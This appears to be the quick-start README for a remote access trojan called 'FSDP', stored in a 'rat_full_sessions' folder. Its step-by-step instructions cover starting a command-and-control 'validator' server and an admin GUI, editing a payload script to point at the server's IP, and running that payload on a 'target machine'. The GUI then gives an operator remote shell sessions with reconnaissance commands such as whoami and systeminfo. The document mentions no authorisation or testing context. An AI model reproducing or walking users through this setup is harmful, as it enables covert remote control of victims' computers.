# FSDP Quick Start - 3 Simple Steps!

## ⚡ Super Easy Setup (No Database, No Node.js!)

### Step 1: Start Validator (1 command)

```cmd
cd rat_full_sessions
python blockchain_validator.py
```

**Note the IP address** shown (e.g., `38.89.139.10:5000`)

---

### Step 2: Start Admin GUI (1 command)

Open a **new terminal/command prompt** and run:

```cmd
cd rat_full_sessions
python admin_gui.py
```

A nice GUI window will open! 🎨

---

### Step 3: Run Payload on Target (1 command)

On your target machine:

```cmd
cd rat_full_sessions\fsdp\test_payloads
python fsdp_payload_enhanced.py
```

**Edit the file first** to set your validator IP:
- Open `fsdp_payload_enhanced.py`
- Find line: `BLOCKCHAIN_NODE = "localhost:5000"`
- Change to: `BLOCKCHAIN_NODE = "38.89.139.10:5000"` (your validator IP)
- Save and run

---

## 🎯 Using the GUI

### Dashboard Tab
- See connected targets count
- View active sessions
- Check blockchain status
- Read activity log

### Targets Tab
1. Click **"Refresh"** to see connected targets
2. Select a target
3. Click **"Open Session"**
4. Done! Session created

### Terminal Tab
1. After opening a session, click **"Create Terminal"**
2. Type commands in the command box
3. Press **Enter** or click **"Execute"**
4. See output in the black terminal window

### Sessions Tab
- View all active sessions
- Close sessions when done

---

## 📝 Example Commands to Try

```bash
# Windows
whoami
dir
ipconfig
systeminfo
echo Hello from FSDP!

# Linux
whoami
ls -la
pwd
uname -a
echo Hello from FSDP!
```

---

## ✨ Features

✅ **No database setup** - Just Python!  
✅ **No Node.js** - Just Python!  
✅ **No web server** - Just Python!  
✅ **Nice GUI** - Built with tkinter (included in Python)  
✅ **Multiple tabs** - Dashboard, Targets, Terminal, Sessions  
✅ **Real-time updates** - Targets discovered automatically  
✅ **Multiple terminals** - Create as many as you need  
✅ **Session management** - Open/close sessions easily  

---

## 🐛 Troubleshooting

### "No targets showing up"
- Wait 30 seconds after starting payload
- Click "Refresh" button in Targets tab
- Check validator is still running
- Check payload has correct validator IP

### "Command not executing"
- Make sure you created a terminal first
- Check session is still active
- Look at the activity log for errors

### "GUI won't start"
- Make sure Python has tkinter: `python -m tkinter`
- On Linux, install: `sudo apt-get install python3-tk`
- On Windows, tkinter is included by default

---

## 🎬 Complete Workflow

```
Terminal 1: python blockchain_validator.py
            (Keep running, note the IP)

Terminal 2: python admin_gui.py
            (GUI opens)

Target Machine: python fsdp_payload_enhanced.py
                (Edit file first with validator IP)

In GUI:
1. Go to "Targets" tab → Click "Refresh"
2. Select your target → Click "Open Session"
3. Go to "Terminal" tab → Click "Create Terminal"
4. Type commands → Press Enter
5. See results in black terminal window!
```

---

## 🚀 That's It!

**No complicated setup. No database. No web server.**

**Just 3 Python scripts and you're controlling remote machines!**

---

## 📸 What You'll See

**Dashboard:**
- Connected Targets: 1
- Active Sessions: 0
- Blockchain Blocks: 3
- Activity log showing all actions

**Targets Tab:**
- Table showing all connected machines
- Hostname, IP, Platform, Status

**Terminal Tab:**
- Black terminal window (like cmd/bash)
- Command input box at bottom
- Execute button
- Real-time output

**Sessions Tab:**
- List of all open sessions
- Session ID, Target, Status, Terminals count

---

**Enjoy your FSDP Admin GUI! 🎉**

